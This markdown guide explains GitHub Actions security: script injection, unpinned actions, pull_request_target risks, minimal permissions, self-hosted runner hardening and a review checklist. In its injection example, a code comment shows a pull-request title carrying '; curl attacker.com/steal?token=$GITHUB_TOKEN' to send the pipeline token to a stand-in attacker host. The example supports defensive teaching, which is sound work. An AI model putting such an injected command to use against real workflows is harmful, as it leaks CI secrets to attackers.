# GitHub Actions Security

## Common Vulnerabilities in GitHub Actions

### 1. Script Injection

User-controlled inputs can inject commands into shell scripts.

```yaml
# VULNERABLE: User-controlled input in script
- name: Greet PR author
  run: |
    echo "Hello ${{ github.event.pull_request.title }}"
    # If PR title contains: "; curl attacker.com/steal?token=$GITHUB_TOKEN"
    # The attacker's command runs with pipeline permissions
```

**Fix: Use environment variables**

```yaml
# SAFE: Input passed as environment variable
- name: Greet PR author
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: |
    echo "Hello $PR_TITLE"
```

### 2. Untrusted Third-Party Actions

```yaml
# RISKY: Using unpinned community action
- uses: random-user/cool-action@main  # Could change at any time

# SAFER: Pin to commit SHA
- uses: random-user/cool-action@a1b2c3d4e5f6  # Immutable reference

# SAFEST: Fork and maintain internally
- uses: my-org/cool-action-fork@v1.0.0
```

### 3. Pull Request Target Dangers

```yaml
# DANGEROUS: pull_request_target runs with base repo permissions
on:
  pull_request_target:
    types: [opened]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          # This checks out UNTRUSTED code with PRIVILEGED context
      - run: npm install  # Runs attacker's package.json scripts!
```

**Safe pattern:**

```yaml
# Split into two workflows: unprivileged build + privileged comment
# Workflow 1: Build (pull_request - unprivileged)
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Safe: checks out PR code unprivileged
      - run: npm ci && npm test

# Workflow 2: Comment (workflow_run - privileged but no untrusted code)
on:
  workflow_run:
    workflows: ["Build"]
    types: [completed]
```

### 4. Workflow Permissions

Always use minimum required permissions:

```yaml
# Set restrictive default at workflow level
permissions:
  contents: read

jobs:
  deploy:
    # Override per-job only when needed
    permissions:
      contents: read
      deployments: write
```

### Organization-wide defaults:

```
Settings > Actions > General > Workflow permissions
→ Select "Read repository contents and packages permissions"
```

## Securing Self-Hosted Runners

!!! danger "Self-Hosted Runner Risks"
    Self-hosted runners persist between jobs. A malicious workflow can:

    - Leave malware on the runner
    - Access secrets from previous jobs
    - Tamper with tools or the build environment
    - Pivot to your internal network

### Hardening Self-Hosted Runners

1. **Use ephemeral runners** — destroy after each job
2. **Isolate runners** — dedicated network, no access to production
3. **Never use self-hosted runners for public repos**
4. **Use runner groups** — restrict which repos can use which runners
5. **Monitor runner activity** — log and alert on suspicious behavior

```yaml
# Ephemeral runner configuration
jobs:
  build:
    runs-on:
      group: secure-runners
      labels: [self-hosted, linux, ephemeral]
```

## GitHub Actions Security Checklist

```markdown
## Workflow Security Review Checklist

### Permissions
- [ ] Workflow has explicit `permissions` block
- [ ] Each job uses minimum required permissions
- [ ] `GITHUB_TOKEN` permissions are scoped appropriately

### Inputs & Injection
- [ ] No user inputs directly in `run:` scripts
- [ ] All external inputs sanitized via environment variables
- [ ] `pull_request_target` is not used with untrusted code checkout

### Dependencies
- [ ] All actions pinned to full commit SHAs
- [ ] Third-party actions audited before use
- [ ] Dependabot configured for GitHub Actions updates

### Secrets
- [ ] No secrets in workflow files
- [ ] Secrets scoped to specific environments
- [ ] OIDC used instead of long-lived tokens where possible

### Runners
- [ ] Self-hosted runners are ephemeral
- [ ] Public repos only use GitHub-hosted runners
- [ ] Runner groups properly configured
```

## Security-Focused Actions

| Action | Purpose |
|--------|---------|
| `step-security/harden-runner` | Monitor and restrict runner network access |
| `ossf/scorecard-action` | OpenSSF Scorecard for repo security assessment |
| `github/codeql-action` | Code scanning with CodeQL |
| `aquasecurity/trivy-action` | Vulnerability scanning |
| `slsa-framework/slsa-github-generator` | SLSA provenance generation |
